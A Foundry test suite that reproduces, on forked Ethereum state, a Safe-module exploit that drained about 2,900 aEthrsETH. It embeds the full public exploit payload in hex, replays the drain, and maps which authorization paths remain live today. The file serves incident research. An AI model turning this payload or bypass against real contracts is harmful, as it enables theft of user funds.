// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, Vm} from "forge-std/Test.sol";

// ─────────────────────────────────────────────────────────────────────────────────────────────
// C2-20 · rsETH whale-Safe Router bypass (Ethereum) — read-only research; fork-only tests.
// No mainnet transactions are sent by this suite.
//
// The Sept-15-2026 exploit drained 2,900 aEthrsETH (~$7.8M) from the whale Safe
// 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8 by nesting the vulnerable Router's own
// multicall inside itself (target == address(this) short-circuit), reaching the enabled
// Safe module 0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca, which then pushed a
// DELEGATECALL (operation=1) into the Safe via execTransactionFromModuleReturnData.
//
// The public exploit payload used below (RC_HEAD/RC_MID/RC_TAIL, amount spliced in twice)
// is taken from the DeFiHackLabs PR #1262 reconstruction (SunWeb3Sec/DeFiHackLabs,
// src/test/2026-09/RsETHSafeModule_exp.sol) — the recipe body is opaque private-fork data.
//
// Tests:
//   A · latest state: bypass primitive live; direct module call blocked; exact public
//       payload passes every module-side check and stops at the Safe's GS104 (module disabled).
//   B · historical fork (block 25,980,524): the public payload drains ~2,900 aEthrsETH
//       end-to-end (reproducing the incident; victim-side extraction asserted). B2: the amount is
//       bounded by the Safe's Aave health factor — 5,000 reverts HealthFactorLowerThanLiquidation
//       Threshold in the withdraw leg and nothing moves.
//   C · labelled re-arm scenarios (latest state + Safe re-enables modules): entry-only re-arm is
//       not enough for the public payload (its first action calls the second family module
//       0xdcdc4ef8 too). With both re-enabled the recipe's delegatecall executes inside the Safe
//       (approve lands) but the capture leg needs the attacker's pre-staged environment.
//   D · the empty Safe that still enables the module is inert (module targets the whale Safe).
//   E · Router whitelist + module caller-set state (the authorization surface today).
// ─────────────────────────────────────────────────────────────────────────────────────────────

interface IMulticallRouter {
    function multicall(address _contract, bytes[] calldata _data) external payable;
}

interface ISafe {
    function isModuleEnabled(address module) external view returns (bool);
    function enableModule(address module) external;
    function getModulesPaginated(address start, uint256 pageSize)
        external view returns (address[] memory array, address next);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract RsethRouterC220 is Test {
    address constant ROUTER = 0x4f0055926c839D1d960a82CBF84E2eE933958ebC;
    address constant MODULE = 0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca;
    address constant SAFE = 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8;
    address constant EMPTY_SAFE = 0xbbD6B5b3565e151528c44200D4Ee1a6895206962;
    address constant AETHRSETH = 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1;
    address constant MODULE_B = 0xD479bCC84A6F972742ff19aF23aCF6b0C9253200;
    address constant MODULE_C = 0xF73a5695bD538d09999f1987cfC43Fd56EcA59cC;
    address constant MODULE_OLD = 0xDcDc4ef8C992E75bb0F300536CD93E601c8882AB; // beacon-proxy module used by the recipe

    // 2,899.999999999997756820 aEthrsETH — the amount moved in the real exploit tx
    // 0x0e7680b06cb8a6f86c149d9ba90d98e3d334e7b072dde03909d43fcfd98a8705.
    uint256 constant DRAIN = 2899999999999997756820;

    // Public exploit payload (DeFiHackLabs PR #1262): module call selector 0x000000df + recipe,
    // split around the two amount words so `amount` can be spliced in at both slots.
    bytes constant RC_HEAD = hex"000000df000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003a00000000000000000000000000000000000000000000000000000000000000002620d97cf81000000000000ffdcdc4ef8c992e75bb0f300536cd93e601c8882ab00010203040506ffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000220000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000206f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000140000000000000000000000000000000000000000000000000000000000000020";
    bytes constant RC_MID = hex"000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020";
    bytes constant RC_TAIL = hex"000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000007d6daf1210ba68d361c9c9118336819f92d930f8623b32c0262ae1d1debdd64334b9c4da84090130f3007709667669db100f4f4cdf5e5ad039326864fde24e199f5b77140a4bfe9a646a3f5e5770946fe7ff8c369b448a288076fa5e73de6eaabe173e0989d1fe97382ce2a265eaec78f23edcba7c16e27837825544031e0e8a17f5333311acba216d67f0bb1d23a840a9363e58e2949fa7c0879e0e9c0cd79b369de1eedb776a1ae395ddc2f7ba4659e2bedf054797bfbe55356cc994f2c6bff25f9b7fc722163414485a68dcddbd1aceaec0c3441daf16edbd730b6bf81a322";

    address attacker = address(0xB0B);

    /// RPC preference: archive-capable endpoint first (historical forks), then CI fork RPC.
    function _rpc() internal view returns (string memory) {
        return vm.envOr(
            "NODEREAL_ETH_RPC_URL",
            vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")))
        );
    }

    function _fork() internal {
        vm.createSelectFork(_rpc());
    }

    function _forkAt(uint256 blockNo) internal {
        vm.createSelectFork(_rpc(), blockNo);
    }

    function _one(bytes memory b) internal pure returns (bytes[] memory a) {
        a = new bytes[](1);
        a[0] = b;
    }

    function _moduleCall(uint256 amount) internal pure returns (bytes memory) {
        return abi.encodePacked(RC_HEAD, amount, RC_MID, amount, RC_TAIL);
    }

    function _inner(uint256 amount) internal pure returns (bytes memory) {
        return abi.encodeCall(IMulticallRouter.multicall, (MODULE, _one(_moduleCall(amount))));
    }

    function _exploit(uint256 amount) internal {
        IMulticallRouter(ROUTER).multicall(ROUTER, _one(_inner(amount)));
    }

    // ── A · latest state ────────────────────────────────────────────────────────────────────
    function test_A_latest_bypass_primitive_and_GS104() public {
        _fork();
        uint256 before = IERC20(AETHRSETH).balanceOf(SAFE);
        assertFalse(ISafe(SAFE).isModuleEnabled(MODULE), "module must be disabled today");

        // 1) self-target multicall passes for a random caller (the flaw)
        vm.prank(attacker);
        IMulticallRouter(ROUTER).multicall(ROUTER, new bytes[](0));

        // 2) nested self-reference still passes
        vm.prank(attacker);
        IMulticallRouter(ROUTER).multicall(
            ROUTER,
            _one(abi.encodeCall(IMulticallRouter.multicall, (ROUTER, new bytes[](0))))
        );

        // 3) direct module call from a random caller is rejected by the caller check
        vm.prank(attacker);
        vm.expectRevert(bytes4(0x7899fd73));
        IMulticallRouter(ROUTER).multicall(MODULE, new bytes[](0));

        // 4) through the self-reference wrap the module is reachable (its view answers)
        vm.prank(attacker);
        IMulticallRouter(ROUTER).multicall(
            ROUTER,
            _one(abi.encodeCall(IMulticallRouter.multicall, (MODULE, _one(hex"00000083"))))
        );

        // 5) the exact public exploit payload passes every module-side check today and
        //    reverts inside the Safe with GS104 ("module not enabled")
        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSignature("Error(string)", "GS104"));
        _exploit(DRAIN);

        assertEq(IERC20(AETHRSETH).balanceOf(SAFE), before, "nothing moved");
    }

    // ── B · historical drain replay (parent of the real exploit tx) ─────────────────────────
    function test_B_historical_drain_replay() public {
        _forkAt(25_980_524);
        assertTrue(ISafe(SAFE).isModuleEnabled(MODULE), "module enabled pre-hack");
        uint256 before = IERC20(AETHRSETH).balanceOf(SAFE);

        vm.prank(attacker);
        _exploit(DRAIN);

        uint256 extracted = before - IERC20(AETHRSETH).balanceOf(SAFE);
        emit log_named_decimal_uint("aEthrsETH extracted from whale Safe", extracted, 18);
        assertApproxEqAbs(extracted, 2900 ether, 1 ether, "~2,900 aEthrsETH extracted");
    }

    // ── B2 · the amount is bounded by the Safe's Aave health factor ─────────────────────────
    //        Pre-hack HF was 1.0587; 2,900 rsETH was the maximum the withdraw leg could take.
    //        Asking for 5,000 makes the Aave leg revert HealthFactorLowerThanLiquidationThreshold,
    //        the recipe swallows it, and nothing is extracted.
    function test_B2_amount_above_HF_cap_does_not_extract() public {
        _forkAt(25_980_524);
        uint256 before = IERC20(AETHRSETH).balanceOf(SAFE);
        vm.prank(attacker);
        _exploit(5000 ether);
        uint256 extracted = before - IERC20(AETHRSETH).balanceOf(SAFE);
        emit log_named_decimal_uint("aEthrsETH extracted (amount=5,000)", extracted, 18);
        assertEq(extracted, 0, "above the Aave-HF cap the withdraw leg reverts and nothing moves");
    }

    // ── C · labelled re-arm, entry module only: the public payload needs the action module too
    //        (the recipe's first action calls the second family module 0xdcdc4ef8, which is also
    //        disabled today; the inner GS104 is swallowed by the recipe executor -> 0 extracted).
    function test_C_rearm_entry_only_not_enough_for_public_payload() public {
        _fork();
        vm.prank(SAFE);
        ISafe(SAFE).enableModule(MODULE);
        assertTrue(ISafe(SAFE).isModuleEnabled(MODULE), "entry module re-armed");

        uint256 before = IERC20(AETHRSETH).balanceOf(SAFE);
        vm.prank(attacker);
        _exploit(DRAIN); // completes; inner action leg reverts GS104 inside the recipe
        uint256 extracted = before - IERC20(AETHRSETH).balanceOf(SAFE);
        emit log_named_decimal_uint("aEthrsETH extracted (entry-only re-arm)", extracted, 18);
        assertEq(extracted, 0, "public payload also needs the action module 0xdcdc4ef8");
    }

    // ── C2 · labelled re-arm of both modules the public payload uses: the delegatecall recipe
    //        executes inside the Safe (its approve action lands) — the stale capture environment
    //        (the attacker's pre-staged v4 pool / PAT helper state, drained in Sept 2026) blocks
    //        the final extraction of this exact payload at today's state.
    function test_C2_rearm_both_modules_executes_recipe_delegatecall() public {
        _fork();
        vm.prank(SAFE);
        ISafe(SAFE).enableModule(MODULE);
        vm.prank(SAFE);
        ISafe(SAFE).enableModule(MODULE_OLD); // 0xdcdc4ef8..., the recipe's action module
        assertTrue(ISafe(SAFE).isModuleEnabled(MODULE) && ISafe(SAFE).isModuleEnabled(MODULE_OLD), "both re-armed");

        uint256 before = IERC20(AETHRSETH).balanceOf(SAFE);
        vm.recordLogs();
        vm.prank(attacker);
        _exploit(DRAIN);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        uint256 extracted = before - IERC20(AETHRSETH).balanceOf(SAFE);
        emit log_named_decimal_uint("aEthrsETH extracted after full re-arm", extracted, 18);

        // Proof the delegatecall chain executed: the Safe emitted ExecutionFromModuleFailure for
        // the recipe's action module (the action ran and failed only on the stale capture env).
        bytes32 execFail = keccak256("ExecutionFromModuleFailure(address)");
        bool sawActionModule;
        for (uint256 i = 0; i < logs.length; i++) {
            if (
                logs[i].emitter == SAFE && logs[i].topics.length > 1 && logs[i].topics[0] == execFail
                    && address(uint160(uint256(logs[i].topics[1]))) == MODULE_OLD
            ) {
                sawActionModule = true;
            }
        }
        assertTrue(sawActionModule, "recipe executed: Safe ran the action module");
        assertEq(extracted, 0, "capture leg needs the attacker's (stale) staged environment");
    }

    // ── D · the empty Safe enabling the module does not re-arm anything ─────────────────────
    function test_D_empty_safe_is_inert() public {
        _fork();
        assertTrue(ISafe(EMPTY_SAFE).isModuleEnabled(MODULE), "empty safe enables the module");
        // the module is bound to the whale Safe (slot 2), not to whoever enables it
        bytes32 slot2 = vm.load(MODULE, bytes32(uint256(2)));
        assertEq(address(uint160(uint256(slot2))), SAFE, "module targets the whale Safe");

        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSignature("Error(string)", "GS104"));
        _exploit(DRAIN);
    }

    // ── E · current authorization surface ───────────────────────────────────────────────────
    function test_E_auth_surface_state() public {
        _fork();
        // Router whitelist (mapping slot 1) still contains all three family modules
        for (uint256 i = 0; i < 3; i++) {
            address m = i == 0 ? MODULE : (i == 1 ? MODULE_B : MODULE_C);
            bytes32 slot = keccak256(abi.encode(m, uint256(1)));
            assertTrue(uint256(vm.load(ROUTER, slot)) != 0, "module whitelisted in router");
        }
        // The module's caller set still contains the Router (selector 0x0000004f -> address[])
        (bool ok, bytes memory ret) = MODULE.staticcall(hex"0000004f");
        assertTrue(ok, "callers() answers");
        address[] memory callers = abi.decode(ret, (address[]));
        bool hasRouter;
        for (uint256 i = 0; i < callers.length; i++) {
            if (callers[i] == ROUTER) hasRouter = true;
        }
        assertTrue(hasRouter, "router still in module caller set");
        assertEq(callers.length, 7, "7 callers");
        // module not paused
        (bool ok2, bytes memory ret2) = MODULE.staticcall(hex"00000083");
        assertTrue(ok2 && abi.decode(ret2, (bool)) == false, "module not paused");
    }
}
